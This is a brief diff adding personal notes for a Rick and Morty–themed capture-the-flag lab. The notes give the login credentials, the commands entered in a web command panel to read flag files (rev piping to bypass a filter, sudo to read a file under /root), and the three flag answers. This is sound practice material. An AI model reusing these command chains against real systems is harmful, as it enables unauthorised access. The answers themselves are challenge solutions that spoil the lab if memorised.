@@ -1,0 +1,32 @@
+username 
+'''
+R1ckRul3s
+'''
+
+password?
+'''
+Wubbalubbadubdub
+'''
+
+using this username and password to login at - /login.php
+and then using directory traversal.
+
+first ingredient - rev Sup3rS3cretPickl3Ingred.txt|rev
+'''
+mr. meeseek hair
+'''
+
+second ingredients - cd /home;ls -l;cd rick;ls -l;rev 'second ingredients'|rev
+'''
+1 jerry tear
+'''
+
+sudo -l 
+'''
+we can use any command as sudo
+'''
+
+third ingredients - sudo rev /root/3rd.txt|sudo rev
+'''
+fleeb juice
+'''
